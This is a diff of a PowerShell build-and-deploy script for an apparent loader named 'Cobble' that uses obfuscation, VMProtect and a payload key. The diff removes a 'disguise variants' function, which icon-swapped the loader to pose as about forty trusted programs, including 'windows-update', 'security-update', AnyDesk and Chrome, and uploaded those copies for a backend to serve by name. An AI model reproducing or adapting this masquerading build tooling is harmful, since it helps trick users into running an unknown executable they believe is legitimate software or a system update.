@@ -14,7 +14,6 @@
     .\build.ps1 -SignExisting -Deploy    Sign/deploy externally protected binaries
     .\build.ps1 -Pack -Deploy            Pack + scp to VPS, then tag
     .\build.ps1 -ReleaseNotesOnly        Generate JSON/Markdown without network calls
-    .\build.ps1 -Pack -SkipDisguises     Pack without icon-disguise variants
     .\build.ps1 -Clean                   Wipe out/, generated/, hash headers
     .\build.ps1 -SkipDLL                 Loader-only rebuild
 
@@ -45,21 +44,7 @@ param(
     [string]$ReleaseNotes = "",
     [switch]$ReleaseNotesOnly,
     [switch]$AllowDirtyRelease,
-    [string]$BaseRef = "",
-    [switch]$SkipDisguises,
-    [string]$RceditPath = "",
-    [string]$IconsDir = "",
-    [string[]]$DisguiseSlugs = @(
-        "anydesk","obs-studio","spotify","discord","lunar-client","steam",
-        "notion","slack","figma","vscode","chrome","firefox","zoom","teams",
-        "skype","blender","unity-hub","epic-games","overwolf","razer-synapse",
-        "nvidia-geforce-experience","amd-adrenalin","intel-driver-support",
-        "realtek-audio","corsair-icue","steelseries-gg","logitech-ghub",
-        "windows-update","microsoft-store","valorant","adobe-photoshop",
-        "adobe-premiere","autocad","sketchup","visual-studio","web-browser",
-        "system-utility","security-update","microsoft-edge","driver-update",
-        "riot-client"
-    )
+    [string]$BaseRef = ""
 )
 
 Set-StrictMode -Version Latest
@@ -127,8 +112,8 @@ function New-ReleaseNotes {
 }
 
 if ($ReleaseNotesOnly -and
-    ($Clean -or $Build -or $Obfuscate -or $Pack -or $SkipDLL -or $SignExisting -or $Deploy -or $SkipDisguises)) {
-    Write-Log "-ReleaseNotesOnly cannot be combined with build, sign, deploy, or disguise modes" FAIL
+    ($Clean -or $Build -or $Obfuscate -or $Pack -or $SkipDLL -or $SignExisting -or $Deploy)) {
+    Write-Log "-ReleaseNotesOnly cannot be combined with build, sign, or deploy modes" FAIL
     exit 1
 }
 
@@ -572,67 +557,6 @@ if (-not $env:PAYLOAD_KEY) {
     Write-Log "PAYLOAD_KEY not set - add payload_key to cobble.json or set the env var" FAIL; exit 1
 }
 
-# --- Disguise variants -------------------------------------------------------
-# Explorer renders an .exe icon from its embedded PE resources, NOT from the
-# filename, so a renamed loader keeps the Cobble icon and blows the disguise.
-# Variants are icon-swapped copies of the packed loader, served by the backend
-# via GET /api/update/loader?as=<slug>. Slugs must match cobble-web DISGUISE_NAMES;
-# unknown slugs fall back to the stock binary server-side.
-# Missing rcedit/icons only skip variants - the release itself still succeeds.
-# Run tools\extract-disguise-icons.ps1 once per build pc to pull icons from installed programs.
-# NOTE: variants are stamped AFTER VMProtect. If the .vmp profile enforces
-# file-integrity checks, launch one variant once before deploying.
-function New-DisguiseVariants {
-    param([string]$ReleaseDir)
-
-    if ($SkipDisguises) {
-        Write-Log "Disguise variants skipped (-SkipDisguises)" INFO
-        return
-    }
-
-    $stockLoader = Join-Path $ReleaseDir "CobbleLoader.exe"
-    Assert-File $stockLoader "Stock loader missing; cannot build disguise variants"
-
-    $iconsDir = if ($IconsDir) { $IconsDir } else { Join-Path $Paths.Root "icons" }
-    if (-not (Test-Path $iconsDir)) {
-        Write-Log "No icons dir ($iconsDir) - skipping disguise variants" INFO
-        return
-    }
-
-    $rcedit = $RceditPath
-    if (-not $rcedit) {
-        $bundled = Join-Path $Paths.Root "tools\rcedit-x64.exe"
-        if (Test-Path $bundled) { $rcedit = $bundled }
-    }
-    if (-not $rcedit) {
-        Write-Log "rcedit not found - skipping disguise variants (pass -RceditPath or add tools\rcedit-x64.exe)" WARN
-        return
-    }
-
-    $outDir = Join-Path $ReleaseDir "disguises"
-    New-Item -ItemType Directory -Force -Path $outDir | Out-Null
-    $hashes = [ordered]@{}
-    $built = 0
-    $skipped = 0
-    foreach ($slug in $DisguiseSlugs) {
-        $ico = Join-Path $iconsDir ($slug + ".ico")
-        if (-not (Test-Path $ico)) { $skipped++; continue }
-        $dest = Join-Path $outDir ($slug + ".exe")
-        Copy-Item -LiteralPath $stockLoader -Destination $dest -Force
-        & $rcedit $dest --set-icon $ico
-        if ($LASTEXITCODE -ne 0) {
-            Remove-Item $dest -Force -ErrorAction SilentlyContinue
-            Write-Log "rcedit failed for $slug - skipped" WARN
-            continue
-        }
-        $hashes[$slug] = Get-SHA256 $dest
-        $built++
-    }
-    ($hashes | ConvertTo-Json -Compress) |
-        Out-File -FilePath (Join-Path $outDir "hashes.json") -Encoding ASCII
-    Write-Log "Disguise variants: $built built, $skipped skipped (no icon)" OK
-}
-
 function New-SignedRelease {
     param(
         [string]$SourceLoader,
@@ -717,7 +641,6 @@ function New-SignedRelease {
             Copy-Item -LiteralPath (Join-Path $stageDir $name) `
                 -Destination (Join-Path $Paths.ReleaseDir $name) -Force
         }
-        New-DisguiseVariants -ReleaseDir $Paths.ReleaseDir
         Write-Log "Deployment bundle v$version signed and prepared locally" OK
 
         return [pscustomobject]@{
@@ -754,13 +677,6 @@ function Deploy-Release {
     & scp @sshOpts $Files "${vpsUser}@${vpsHost}:${remotePath}/"
     if ($LASTEXITCODE -ne 0) { Write-Log "scp failed" FAIL; exit 1 }
     Write-Log "Deployed $($Files.Count) files to ${vpsUser}@${vpsHost}:${remotePath}" OK
-
-    $disguiseDir = Join-Path $Paths.ReleaseDir "disguises"
-    if (Test-Path (Join-Path $disguiseDir "hashes.json")) {
-        & scp @sshOpts -r $disguiseDir "${vpsUser}@${vpsHost}:${remotePath}/"
-        if ($LASTEXITCODE -ne 0) { Write-Log "disguises scp failed" FAIL; exit 1 }
-        Write-Log "Deployed disguise variants" OK
-    }
 }
 
 function Complete-ReleaseDeployment {
